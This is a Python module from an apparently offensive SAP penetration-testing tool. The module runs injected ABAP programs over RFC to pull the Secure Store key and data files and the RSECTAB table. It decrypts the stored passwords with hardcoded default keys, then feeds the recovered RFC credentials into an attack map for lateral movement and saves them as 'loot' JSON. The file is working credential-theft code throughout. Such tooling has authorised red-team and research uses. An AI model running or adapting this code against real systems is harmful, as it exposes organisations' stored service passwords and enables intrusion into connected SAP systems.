"""
sapmap_secstore.py – SAP ABAP Secure Store (RSECTAB) reader and decryptor.

After gaining access to an SAP ABAP system, reads the RSECTAB table via
RFC_READ_TABLE and decrypts each row using the 3DES-based scheme described
in the ERPScan research "All your SAP passwords belong to us" (2014).

Algorithm (Python 3 port of the original Python 2.7 / pyDes implementation):

  Step 1 — decrypt ciphertext with default key (keydef)   → data_pass1
  Step 2 — extract SID and instance number from data_pass1
           derive keyprime = XOR keydef bytes with MD5(SID+instno) nibbles
  Step 3 — decrypt first 136 bytes of data_pass1 with keyprime → data_pass2
  Step 4 — extract password from data_pass2[2 : 2+pass_len]

The "triple-DES" is a manual 3-pass scheme (NOT standard EDE 3DES):
  pass 1: DES-CBC decrypt  with key[16:24]
  pass 2: DES-CBC encrypt  with key[8:16]
  pass 3: DES-CBC decrypt  with key[0:8]
  IV = 8 null bytes for every pass.

Requires pycryptodome:  pip install pycryptodome
"""

import datetime
import hashlib
import json
import os
import re
import traceback

try:
    from Crypto.Cipher import DES as _CryptoDES
    _HAVE_CRYPTO = True
except ImportError:
    _HAVE_CRYPTO = False

import sapmap_rfc
from sapmap_models import Credentials, RFCConnection

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Default 24-byte 3DES key hardcoded in SAP installations (all systems share
# this key unless the admin has configured an individual key).
DEFAULT_KEY_HEX = "b1e09244ec19eb3401dfc846ab225820c71bc376581eb3e4"

# Hardcoded KEK (Key Encryption Key) used to decrypt SSFS_<SID>.KEY files
# that use the encrypted format (187 bytes).  Embedded in all SAP rsecssfx
# binaries — same on every installation.
_SSFS_KEK_HEX = "9f60a6dd7e157d070cc357909aa290e9360eee472fda4772"

# RSECTAB.DATA is RAW(184) = 184 bytes = 368 hex chars
_DATA_LEN_BYTES = 184

# SSFS key file sizes
_SSFS_KEY_PLAIN_SIZE = 92    # SAPSSFSKey   — key at offset 12, 24 bytes
_SSFS_KEY_ENC_SIZE   = 187   # SAPSSFSKeyE  — encrypted key at offset 130, 57 bytes


# ---------------------------------------------------------------------------
# Internal crypto helpers
# ---------------------------------------------------------------------------

def _require_crypto():
    if not _HAVE_CRYPTO:
        raise RuntimeError(
            "pycryptodome is required for SecStore decryption. "
            "Install with:  pip install pycryptodome"
        )


def _des_ecb_encrypt(key8: bytes, block8: bytes) -> bytes:
    """Single DES ECB encrypt of one 8-byte block."""
    c = _CryptoDES.new(key8, _CryptoDES.MODE_ECB)
    return c.encrypt(block8)


def _des3_manual(key24: bytes, data: bytes) -> bytes:
    """
    RSECTAB decryption uses standard DES-CBC (NOT SAP's RSECCipher).
    Manual 3-pass: decrypt key[16:24], encrypt key[8:16], decrypt key[0:8].
    IV = 8 null bytes for each pass.
    """
    iv = b"\x00" * 8

    c1 = _CryptoDES.new(key24[16:24], _CryptoDES.MODE_CBC, iv)
    d = c1.decrypt(data)

    c2 = _CryptoDES.new(key24[8:16], _CryptoDES.MODE_CBC, iv)
    d = c2.encrypt(d)

    c3 = _CryptoDES.new(key24[:8], _CryptoDES.MODE_CBC, iv)
    d = c3.decrypt(d)
    return d


def _derive_keyprime(keydef: bytes, data_pass1: bytes) -> bytes:
    """
    Derive the per-system keyprime by XOR-ing specific bytes of keydef with
    nibbles of MD5(SID + instance_number) embedded at the end of data_pass1.
    Mirrors the keyprime[] array manipulation in the original Python 2.7 script.
    """
    sid    = data_pass1[-44:-41]   # 3 bytes
    instno = data_pass1[-41:-31]   # 10 bytes

    h = hashlib.md5()
    h.update(sid + instno)
    m = h.digest()                 # 16 bytes

    kp = bytearray(keydef)
    kp[1]  ^= m[0] & 0xF0
    kp[6]  ^= m[0] & 0x0F
    kp[7]  ^= m[3] & 0xF0
    kp[10] ^= m[1] & 0xF0
    kp[13] ^= m[1] & 0x0F
    kp[16] ^= m[4] & 0x0F
    kp[19] ^= m[2] & 0xF0
    kp[20] ^= m[2] & 0x0F
    return bytes(kp)


# ---------------------------------------------------------------------------
# SSFS key file extraction
# ---------------------------------------------------------------------------

def extract_ssfs_key(key_file_bytes: bytes) -> bytes:
    """Extract the 24-byte SSFS master key from a SSFS_<SID>.KEY file.

    Two formats exist:
      - Plaintext  (92 bytes):  key at offset 12, 24 raw bytes
      - Encrypted (187 bytes):  encrypted key at offset 130, 57 bytes,
                                 decrypted with the hardcoded KEK

    Returns the 24-byte key, or raises ValueError on failure.
    """
    _require_crypto()

    preamble = key_file_bytes[:11]
    if preamble != b"RSecSSFsKey":
        raise ValueError(
            f"Not an SSFS key file (preamble: {preamble!r}, expected b'RSecSSFsKey')"
        )

    size = len(key_file_bytes)

    # --- Plaintext format (92 bytes) ---
    if size == _SSFS_KEY_PLAIN_SIZE:
        key = key_file_bytes[12:36]
        if len(key) != 24:
            raise ValueError(f"Plaintext key truncated: {len(key)} bytes")
        print(f"[*] SSFS key file: plaintext format ({size} bytes)")
        return key

    # --- Encrypted format (187 bytes) ---
    if size == _SSFS_KEY_ENC_SIZE:
        return _decrypt_ssfs_key_enc(key_file_bytes)

    # Unknown size — try to detect
    if size > _SSFS_KEY_ENC_SIZE:
        print(f"[*] SSFS key file: oversized ({size} bytes), trying encrypted format")
        return _decrypt_ssfs_key_enc(key_file_bytes)

    raise ValueError(f"Unknown SSFS key file size: {size} bytes")


def _decrypt_ssfs_key_enc(key_file_bytes: bytes) -> bytes:
    """Decrypt the encrypted SSFS key using the hardcoded KEK.

    Uses SAP's RSECCipher (NOT standard DES) — the same proprietary cipher
    used for all SSFS operations.  The pysap rsec_decrypt_key function
    handles the 57-byte encrypted key blob including the partial-block
    CBC carry for the last byte.
    """
    from sap_rsec_cipher import rsec_decrypt_key
    key_enc = key_file_bytes[130:]
    if len(key_enc) < 57:
        raise ValueError(f"Encrypted key too short: {len(key_enc)} bytes (need 57)")

    key = rsec_decrypt_key(key_enc)
    if len(key) != 24:
        raise ValueError(f"Decrypted key wrong size: {len(key)} bytes (expected 24)")

    print(f"[*] SSFS key file: encrypted format ({len(key_file_bytes)} bytes), "
          f"decrypted to {len(key)}-byte key")
    return key


# ---------------------------------------------------------------------------
# SSFS DAT file parsing
# ---------------------------------------------------------------------------

def parse_ssfs_dat(dat_file_bytes: bytes, ssfs_key: bytes = None) -> list:
    """Parse an SSFS_<SID>.DAT file and return decrypted records.

    Record structure (from pysap SAPSSFS.py):
      Record header (24 bytes):
        bytes  0-11: preamble "RSecSSFsData"
        bytes 12-15: total record length (4 bytes, big-endian)
        byte  16:    type (1 = supported)
        bytes 17-23: filler
      Data header (152 bytes):
        bytes 24-87:   key_name / IDENT (64 bytes, space-padded)
        bytes 88-95:   timestamp
        bytes 96-119:  user (24 bytes)
        bytes 120-143: host (24 bytes)
        byte  144:     is_deleted
        byte  145:     is_stored_as_plaintext
        byte  146:     is_binary_data
        bytes 147-155: filler
        bytes 156-175: HMAC-SHA1 (20 bytes)
      Data payload (variable):
        bytes 176+:  encrypted data (length = total_length - 176)

    If ssfs_key is provided, each record's data payload is decrypted with it.
    Returns list of (ident, data_hex) tuples where data_hex is the encrypted
    (or decrypted) payload as hex.
    """
    _REC_PREAMBLE = b"RSecSSFsData"
    _REC_HEADER_LEN = 176
    _MIN_REC_SIZE = _REC_HEADER_LEN

    if len(dat_file_bytes) < 24:
        print(f"[-] SSFS DAT file too small: {len(dat_file_bytes)} bytes")
        return []

    records = []
    # Scan for record preambles — this is robust against unknown file headers
    pos = 0
    while pos + _MIN_REC_SIZE <= len(dat_file_bytes):
        # Find next record preamble
        idx = dat_file_bytes.find(_REC_PREAMBLE, pos)
        if idx < 0:
            break
        pos = idx

        if pos + _MIN_REC_SIZE > len(dat_file_bytes):
            break

        # Parse record length at offset 12 (4 bytes big-endian)
        rec_len = int.from_bytes(dat_file_bytes[pos + 12:pos + 16], "big")
        if rec_len < _REC_HEADER_LEN or rec_len > 0x18150:
            pos += 12  # skip this preamble occurrence, try next
            continue

        if pos + rec_len > len(dat_file_bytes):
            break

        # Record type at offset 16
        rec_type = dat_file_bytes[pos + 16]

        # Key name (IDENT) at offset 24, 64 bytes, space-padded
        ident_raw = dat_file_bytes[pos + 24:pos + 88]
        ident = ident_raw.rstrip(b" \x00").decode("ascii", errors="replace").strip()

        # Flags
        is_deleted    = dat_file_bytes[pos + 144]
        is_plaintext  = dat_file_bytes[pos + 145]

        # Data payload
        data_start = pos + _REC_HEADER_LEN
        data_len   = rec_len - _REC_HEADER_LEN
        data_bytes = dat_file_bytes[data_start:data_start + data_len]

        if ident and not is_deleted and data_len > 0:
            # Decrypt with SSFS key if provided and data is encrypted.
            # SSFS uses RSECCipher (NOT standard DES) for record encryption.
            if ssfs_key and not is_plaintext and data_len >= 8 and data_len % 8 == 0:
                try:
                    from sap_rsec_cipher import rsec_decrypt
                    data_bytes = rsec_decrypt(data_bytes, ssfs_key)
                except Exception:
                    pass  # leave as encrypted
            records.append((ident, data_bytes.hex().upper()))

        pos += rec_len  # advance to next record

    print(f"[*] SSFS DAT: parsed {len(records)} records from {len(dat_file_bytes)} bytes")
    return records


# ---------------------------------------------------------------------------
# ABAP program to read SSFS files from the OS filesystem
# ---------------------------------------------------------------------------

# Reads both KEY and DAT files via OPEN DATASET, base64-encodes them,
# and outputs in chunked lines that fit the WRITES ZEILE width limit.
_ABAP_READ_SSFS_FILES = [
    "REPORT ZSECSSFS LINE-SIZE 500.",
    "DATA: KEYPATH TYPE STRING.",
    "DATA: DATPATH TYPE STRING.",
    "DATA: XSTR TYPE XSTRING.",
    "DATA: B64 TYPE STRING.",
    "DATA: CHUNK(200) TYPE C.",
    "DATA: OFF TYPE I.",
    "DATA: CLEN TYPE I.",
    "DATA: REMAIN TYPE I.",
    "DATA: SID3(3) TYPE C.",
    "SID3 = SY-SYSID.",
    "CONCATENATE '/usr/sap/' SID3 '/SYS/global/security/rsecssfs/key/SSFS_' SID3 '.KEY' INTO KEYPATH.",
    "CONCATENATE '/usr/sap/' SID3 '/SYS/global/security/rsecssfs/data/SSFS_' SID3 '.DAT' INTO DATPATH.",
    "OPEN DATASET KEYPATH FOR INPUT IN BINARY MODE.",
    "IF SY-SUBRC = 0.",
    "  READ DATASET KEYPATH INTO XSTR.",
    "  CLOSE DATASET KEYPATH.",
    "  CALL METHOD CL_HTTP_UTILITY=>ENCODE_X_BASE64 EXPORTING UNENCODED = XSTR RECEIVING ENCODED = B64.",
    "  CLEN = STRLEN( B64 ).",
    "  WRITE: / '~~~KEYLEN', CLEN.",
    "  OFF = 0.",
    "  WHILE OFF < CLEN.",
    "    REMAIN = CLEN - OFF.",
    "    IF REMAIN > 200. REMAIN = 200. ENDIF.",
    "    CHUNK = B64+OFF(REMAIN).",
    "    WRITE: / '~~~K', CHUNK.",
    "    OFF = OFF + 200.",
    "  ENDWHILE.",
    "ELSE.",
    "  WRITE: / '~~~KEYERR', SY-SUBRC.",
    "ENDIF.",
    "CLEAR: XSTR, B64.",
    "OPEN DATASET DATPATH FOR INPUT IN BINARY MODE.",
    "IF SY-SUBRC = 0.",
    "  READ DATASET DATPATH INTO XSTR.",
    "  CLOSE DATASET DATPATH.",
    "  CALL METHOD CL_HTTP_UTILITY=>ENCODE_X_BASE64 EXPORTING UNENCODED = XSTR RECEIVING ENCODED = B64.",
    "  CLEN = STRLEN( B64 ).",
    "  WRITE: / '~~~DATLEN', CLEN.",
    "  OFF = 0.",
    "  WHILE OFF < CLEN.",
    "    REMAIN = CLEN - OFF.",
    "    IF REMAIN > 200. REMAIN = 200. ENDIF.",
    "    CHUNK = B64+OFF(REMAIN).",
    "    WRITE: / '~~~D', CHUNK.",
    "    OFF = OFF + 200.",
    "  ENDWHILE.",
    "ELSE.",
    "  WRITE: / '~~~DATERR', SY-SUBRC.",
    "ENDIF.",
]


def _read_ssfs_files_via_abap(node, creds) -> tuple:
    """Read SSFS KEY and DAT files from the SAP OS via RFC_ABAP_INSTALL_AND_RUN.

    Returns (key_bytes, dat_bytes) — either or both may be None if not available.
    """
    import base64

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            res = sapmap_rfc._run_abap_program(conn, _ABAP_READ_SSFS_FILES,
                                                "ZSECSSFS")
            if not res.get("success"):
                print(f"[-] SSFS file read failed: {res.get('error')}")
                return None, None

            output = res.get("output", [])
            key_b64_parts = []
            dat_b64_parts = []

            for line in output:
                if line.startswith("~~~KEYERR"):
                    err = line.split(None, 1)[1] if " " in line else line
                    print(f"[*] SSFS KEY file not accessible: {err}")
                elif line.startswith("~~~KEYLEN"):
                    klen = line.split(None, 1)[1].strip() if " " in line else "?"
                    print(f"[*] SSFS KEY file: {klen} base64 chars")
                elif line.startswith("~~~K"):
                    key_b64_parts.append(line[4:].strip())
                elif line.startswith("~~~DATERR"):
                    err = line.split(None, 1)[1] if " " in line else line
                    print(f"[*] SSFS DAT file not accessible: {err}")
                elif line.startswith("~~~DATLEN"):
                    dlen = line.split(None, 1)[1].strip() if " " in line else "?"
                    print(f"[*] SSFS DAT file: {dlen} base64 chars")
                elif line.startswith("~~~D"):
                    dat_b64_parts.append(line[4:].strip())

            key_bytes = None
            dat_bytes = None

            if key_b64_parts:
                try:
                    key_bytes = base64.b64decode("".join(key_b64_parts))
                    print(f"[+] SSFS KEY: {len(key_bytes)} bytes read from OS")
                except Exception as e:
                    print(f"[-] SSFS KEY base64 decode failed: {e}")

            if dat_b64_parts:
                try:
                    dat_bytes = base64.b64decode("".join(dat_b64_parts))
                    print(f"[+] SSFS DAT: {len(dat_bytes)} bytes read from OS")
                except Exception as e:
                    print(f"[-] SSFS DAT base64 decode failed: {e}")

            return key_bytes, dat_bytes

    except Exception as e:
        print(f"[-] SSFS file read error: {e}")
        return None, None


# ---------------------------------------------------------------------------
# Public decrypt function
# ---------------------------------------------------------------------------

def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
    """
    Decrypt one RSECTAB DATA value (hex string, 368 chars).

    Returns a dict:
      password      – decrypted password string  (None on failure)
      password_len  – declared length byte from the structure
      sid           – SID extracted from the decrypted structure
      instance_nr   – installation/instance number extracted
      error         – error message string, or None on success
    """
    result = {
        "password": None,
        "password_len": 0,
        "sid": "",
        "instance_nr": "",
        "error": None,
    }
    try:
        keydef = bytes.fromhex(key_hex)
        data   = bytes.fromhex(data_hex)

        # Data must be a multiple of 8 (DES block size) and at least 184 bytes
        # for RSECTAB.  SSFS records may differ in size.
        if len(data) < 136:
            result["error"] = (
                "DATA too short for decryption: %d bytes (need >= 136)"
                % len(data)
            )
            return result
        if len(data) % 8 != 0:
            # Pad to next 8-byte boundary with nulls
            data = data + b"\x00" * (8 - len(data) % 8)

        # Step 1: decrypt with default/supplied key
        data_pass1 = _des3_manual(keydef, data)

        # Step 2: derive per-system keyprime
        keyprime = _derive_keyprime(keydef, data_pass1)

        # Step 3: decrypt first 136 bytes with keyprime
        data_pass2 = _des3_manual(keyprime, data_pass1[:136])

        # Step 4: parse structure
        #   data_pass2[0:2]    – prefix (2 bytes)
        #   data_pass2[2:111]  – password (up to 109 bytes)
        #   data_pass2[111]    – password length byte
        #   data_pass2[112:116] – magic local
        #   data_pass2[116:120] – magic global salted
        #   data_pass2[120:136] – rec identifier hash
        #   data_pass1[140:143] – SID
        #   data_pass1[143:153] – installation/instance number
        pass_len    = data_pass2[111]
        pass_bytes  = data_pass2[2:2 + min(pass_len, 109)]
        sid         = data_pass1[140:143].rstrip(b"\x00").decode("ascii", errors="replace").strip()
        inst_nr     = data_pass1[143:153].rstrip(b"\x00").decode("ascii", errors="replace").strip()

        result["password"]    = pass_bytes.decode("latin-1", errors="replace")
        result["password_len"] = pass_len
        result["sid"]         = sid
        result["instance_nr"] = inst_nr

    except Exception:
        result["error"] = traceback.format_exc(limit=2)

    return result


# ---------------------------------------------------------------------------
# ABAP program to read RSECTAB with proper hex encoding of the RAW field
# ---------------------------------------------------------------------------

# RFC_READ_TABLE cannot reliably handle RAW(184) fields: binary data may
# contain the pipe delimiter and break row parsing.  Instead we run a tiny
# ABAP report via RFC_ABAP_INSTALL_AND_RUN that reads RSECTAB, hex-encodes
# the DATA field, and writes one line per row as  IDENT~~~hex_DATA .
# Output per RSECTAB row uses 3 short lines to stay within the WRITES
# table ZEILE width limit (~256 chars in RFC_ABAP_INSTALL_AND_RUN):
#   ~~~I <MANDT> <IDENT>        (ident line)
#   ~~~A <first 184 hex chars>  (hex part 1: bytes 0-91)
#   ~~~B <rest 184 hex chars>   (hex part 2: bytes 92-183)
_ABAP_READ_RSECTAB = [
    "REPORT ZSECSTORE LINE-SIZE 500.",
    "TABLES: RSECTAB.",
    "DATA: HEXSTR(368) TYPE C.",
    "DATA: BYTE TYPE X LENGTH 1.",
    "DATA: HI TYPE I.",
    "DATA: LO TYPE I.",
    "DATA: BIDX TYPE I.",
    "DATA: HIDX TYPE I.",
    "DATA: CNT TYPE I.",
    "DATA: HC(16) TYPE C VALUE '0123456789ABCDEF'.",
    "SELECT * FROM RSECTAB CLIENT SPECIFIED.",
    "  CLEAR HEXSTR.",
    "  DO 184 TIMES.",
    "    BIDX = SY-INDEX - 1.",
    "    BYTE = RSECTAB-DATA+BIDX(1).",
    "    HI = BYTE DIV 16.",
    "    LO = BYTE MOD 16.",
    "    HIDX = BIDX * 2.",
    "    HEXSTR+HIDX(1) = HC+HI(1).",
    "    HIDX = HIDX + 1.",
    "    HEXSTR+HIDX(1) = HC+LO(1).",
    "  ENDDO.",
    "  WRITE: / '~~~I', RSECTAB-MANDT, RSECTAB-IDENT.",
    "  WRITE: / '~~~A', HEXSTR(184).",
    "  WRITE: / '~~~B', HEXSTR+184(184).",
    "  CNT = CNT + 1.",
    "ENDSELECT.",
    "WRITE: / '~~~TOTAL:', CNT.",
]


# ---------------------------------------------------------------------------
# Main entry point: read RSECTAB and decrypt all rows
# ---------------------------------------------------------------------------

def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
    """
    Read and decrypt SAP Secure Store entries.

    Strategy (in order of preference):
      1. Read SSFS files from OS filesystem (KEY + DAT) — handles individual keys
      2. Read RSECTAB via ABAP program — fallback for DB-backed secure stores
      3. Read RSECTAB via RFC_READ_TABLE — last resort

    The SSFS key file is always read (if available) to support systems that use
    an individual encryption key instead of the default.
    """
    _require_crypto()

    # --- Step 1: Try to read SSFS files from OS ---
    print(f"[*] SecStore {node.sid}: reading SSFS files from OS filesystem...")
    key_bytes, dat_bytes = _read_ssfs_files_via_abap(node, creds)

    # Extract SSFS master key from KEY file (if available)
    ssfs_key = None
    if key_bytes:
        try:
            ssfs_key = extract_ssfs_key(key_bytes)
        except Exception as e:
            print(f"[-] SecStore {node.sid}: could not extract SSFS key: {e}")

    # Parse SSFS DAT file — decrypt records with SSFS key, and look for
    # the RSECTAB individual key stored as SECSTORE_DB/KEY/...
    actual_key_hex = key_hex   # start with default
    rows = None
    if dat_bytes and ssfs_key:
        try:
            ssfs_records = parse_ssfs_dat(dat_bytes, ssfs_key)
            if ssfs_records:
                print(f"[+] SecStore {node.sid}: {len(ssfs_records)} records from SSFS DAT")

            # Look for the RSECTAB individual key inside the SSFS records
            for ident, data_hex in ssfs_records:
                if ident.startswith("SECSTORE_DB/KEY/"):
                    # The decrypted record contains the 24-byte RSECTAB key
                    # It may have padding/wrapper — try to find 24 usable bytes
                    raw = bytes.fromhex(data_hex)
                    if len(raw) >= 24:
                        candidate = raw[:24]
                        actual_key_hex = candidate.hex()
                        print(f"[+] SecStore {node.sid}: found RSECTAB individual key "
                              f"in SSFS record '{ident}'")
                        if actual_key_hex != DEFAULT_KEY_HEX:
                            print(f"[+] SecStore {node.sid}: key differs from default")
                    break

            # The SSFS DAT itself doesn't contain the same records as RSECTAB
            # (it stores PKI pins, PSE data, and the SECSTORE_DB key itself).
            # We still need RSECTAB for the actual RFC passwords etc.
        except Exception as e:
            print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {e}")

    # --- Step 2: Read RSECTAB (the actual secure store entries) ---
    print(f"[*] SecStore {node.sid}: reading RSECTAB entries...")
    rows = _read_rsectab_via_abap(node, creds)

    if rows is None:
        print("[*] SecStore: ABAP exec unavailable, falling back to RFC_READ_TABLE")
        rows = _read_rsectab_via_rfc(node, creds)

    if not rows:
        print(f"[-] SecStore {node.sid}: no entries found")
        return []

    # --- Step 3: Decrypt all entries ---
    print(f"[*] SecStore {node.sid}: {len(rows)} entries, decrypting "
          f"(key: {'individual' if actual_key_hex != DEFAULT_KEY_HEX else 'default'})...")

    results = []
    for ident, data_hex in rows:
        entry = {"ident": ident}

        if not data_hex:
            entry["error"] = "empty DATA field"
            results.append(entry)
            continue

        # SSFS DAT records may have variable sizes, not just 184 bytes
        dec = decrypt_entry(data_hex, actual_key_hex)
        entry.update(dec)
        results.append(entry)

    return results


def _read_rsectab_via_abap(node, creds) -> list | None:
    """Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN.

    Returns list of (ident, data_hex) tuples, or None if the FM is not
    available.
    """
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            res = sapmap_rfc._run_abap_program(conn, _ABAP_READ_RSECTAB,
                                                "ZSECSTORE")
            if not res.get("success") and "not available" in (res.get("error") or ""):
                return None  # FM not available — caller will fall back

            if not res.get("success"):
                print(f"[-] SecStore ABAP exec error: {res.get('error')}")
                return None

            output = res.get("output", [])
            print(f"[*] SecStore ABAP output: {len(output)} lines")
            if output:
                # Show first few lines for diagnostics
                for i, line in enumerate(output[:3]):
                    print(f"    line {i}: {line[:120]}{'...' if len(line) > 120 else ''}")

            # Parse 3-line groups: ~~~I (ident), ~~~A (hex part1), ~~~B (hex part2)
            rows = []
            cur_ident = None
            cur_hex   = ""
            for line in output:
                if line.startswith("~~~TOTAL:"):
                    total = line.split(":", 1)[1].strip()
                    print(f"[*] SecStore ABAP: {total} rows in RSECTAB")
                    continue
                if line.startswith("~~~I"):
                    # Flush previous entry
                    if cur_ident is not None and cur_hex:
                        rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
                    cur_ident = line[4:].strip()
                    cur_hex   = ""
                elif line.startswith("~~~A"):
                    cur_hex = line[4:].strip()
                elif line.startswith("~~~B"):
                    cur_hex += line[4:].strip()
            # Flush last entry
            if cur_ident is not None and cur_hex:
                rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
            return rows

    except Exception as e:
        print(f"[-] SecStore ABAP read failed: {e}")
        return None


def _read_rsectab_via_rfc(node, creds) -> list | None:
    """Fallback: read RSECTAB via RFC_READ_TABLE (unreliable for RAW fields)."""
    try:
        raw_rows = sapmap_rfc.read_table(
            node, "RSECTAB",
            fields=["IDENT", "DATA"],
            where="", max_rows=9999, creds=creds,
        )
        rows = []
        for r in raw_rows:
            ident    = (r.get("IDENT") or "").strip()
            data_hex = (r.get("DATA") or "").strip().replace(" ", "").upper()
            rows.append((ident, data_hex))
        return rows
    except Exception as e:
        print(f"[-] SecStore RFC_READ_TABLE failed: {e}")
        return None


# ---------------------------------------------------------------------------
# Categorisation and map integration
# ---------------------------------------------------------------------------

# Regex patterns for parsing IDENT strings
_RE_RFC_WITH_USER = re.compile(
    r"^/RFC/([A-Za-z0-9_]+)@([A-Z0-9]{3})(?:CLNT(\d{3}))?(?:\.|$)"
)
_RE_RFC_SIMPLE = re.compile(r"^/RFC/(.+)$")
_RE_DBCON = re.compile(r"^/DBCON/(.+)$")
_RE_CTS = re.compile(r"^/CTS/")
_RE_STRUST = re.compile(r"^/STRUST_PSE_PIN/")
_RE_HMAC = re.compile(r"^/HMAC_INDEP/")


def categorise_entry(entry: dict) -> dict:
    """Add category and parsed fields to a decrypted SecStore entry.

    Modifies and returns the entry dict with added keys:
      category    – rfc | db | cts | smtp | hmac | pse | other
      dest_name   – RFC destination name (rfc only)
      target_sid  – target SID parsed from ident (rfc only)
      rfc_user    – RFC logon user parsed from ident (rfc only)
      rfc_client  – client parsed from CLNTnnn (rfc only)
      mandt       – SAP client extracted from the MANDT prefix
    """
    raw_ident = entry.get("ident", "")

    # Strip the MANDT prefix that the ABAP program prepends.
    # Format: "NNN /path/..." or "    /path/..." (spaces/underscores for cross-client)
    mandt = ""
    ident = raw_ident
    m_prefix = re.match(r"^(\d{3}|[_ ]{3})\s+(.*)$", raw_ident)
    if m_prefix:
        mandt = m_prefix.group(1).strip().replace("_", "")
        ident = m_prefix.group(2)
    entry["mandt"] = mandt
    entry["ident_clean"] = ident

    # --- RFC destinations ---
    m = _RE_RFC_WITH_USER.match(ident)
    if m:
        entry["category"]   = "rfc"
        entry["rfc_user"]   = m.group(1)
        entry["target_sid"] = m.group(2)
        entry["rfc_client"] = m.group(3) or ""
        entry["dest_name"]  = ident[5:]  # everything after /RFC/
        return entry

    m = _RE_RFC_SIMPLE.match(ident)
    if m:
        dest = m.group(1)
        entry["category"]   = "rfc"
        entry["dest_name"]  = dest
        # If dest_name looks like a 3-char SID, use it as target_sid
        entry["target_sid"] = dest if re.match(r"^[A-Z][A-Z0-9]{2}$", dest) else ""
        entry["rfc_user"]   = ""
        entry["rfc_client"] = ""
        return entry

    # --- DB connections ---
    if _RE_DBCON.match(ident):
        entry["category"] = "db"
        return entry

    # --- CTS transport ---
    if _RE_CTS.match(ident):
        entry["category"] = "cts"
        return entry

    # --- SMTP ---
    if "SMTP" in ident.upper():
        entry["category"] = "smtp"
        return entry

    # --- HMAC ---
    if _RE_HMAC.match(ident):
        entry["category"] = "hmac"
        return entry

    # --- PSE / certificate PIN ---
    if _RE_STRUST.match(ident):
        entry["category"] = "pse"
        return entry

    entry["category"] = "other"
    return entry


def integrate_results(node, state, results: list):
    """Integrate decrypted SecStore results into the SAPMAP state.

    1. Store categorised entries on the node.
    2. Enrich existing RFC connections with decrypted passwords.
    3. Add credentials to target nodes on the map.
    """
    # Categorise every entry
    for entry in results:
        categorise_entry(entry)

    # Store on node
    node.secstore_entries = results

    rfc_entries = [e for e in results
                   if e.get("category") == "rfc" and e.get("password")]

    # --- Enrich existing connections ---
    for entry in rfc_entries:
        dest = entry.get("dest_name", "")
        if not dest:
            continue
        for conn in state.get_connections_from(node.sid):
            if conn.destination_name == dest:
                conn.secstore_password = entry["password"]
                print(f"[+] SecStore: enriched RFC dest {dest} with password")
                break

    # --- Add credentials to target nodes ---
    for entry in rfc_entries:
        target_sid = entry.get("target_sid", "")
        target_node = state.get_node(target_sid) if target_sid else None
        if not target_node:
            continue

        rfc_user  = entry.get("rfc_user", "")
        password  = entry["password"]
        client    = entry.get("rfc_client", "") or "000"

        if not rfc_user:
            # Try to derive user from dest_name for simple /RFC/<dest> patterns
            # e.g., /RFC/TMSADM@... → user TMSADM
            continue

        # Avoid duplicates
        already = any(
            c.username.upper() == rfc_user.upper() and c.client == client
            for c in target_node.credentials
        )
        if not already:
            cred = Credentials(
                username=rfc_user,
                password=password,
                client=client,
                instance_nr=target_node.instance_nrs()[0] if target_node.instance_nrs() else "00",
                verified=False,
            )
            target_node.credentials.append(cred)
            print(f"[+] SecStore: added credentials {rfc_user}@{target_sid} "
                  f"client {client} (from RSECTAB)")

        # Create RFC connection if none exists yet
        existing = any(
            c.destination_name == entry.get("dest_name", "")
            for c in state.get_connections_from(node.sid)
        )
        if not existing:
            conn = RFCConnection(
                source_sid=node.sid,
                source_host=node.hostname or node.ip,
                target_sid=target_sid,
                target_host=target_node.hostname or target_node.ip,
                target_ip=target_node.ip,
                destination_name=entry.get("dest_name", ""),
                rfc_user=rfc_user,
                client=client,
                secstore_password=password,
            )
            state.add_connection(conn)
            print(f"[+] SecStore: created RFC connection {node.sid} → "
                  f"{target_sid} via {entry.get('dest_name', '')}")


# ---------------------------------------------------------------------------
# Loot persistence
# ---------------------------------------------------------------------------

def save_loot(node_sid: str, results: list, states_dir: str) -> str:
    """Save decrypted results as JSON loot file. Returns absolute file path."""
    os.makedirs(states_dir, exist_ok=True)
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(states_dir, f"secstore_{node_sid}_{ts}.json")
    with open(filename, "w") as f:
        json.dump(results, f, indent=2)
    return filename
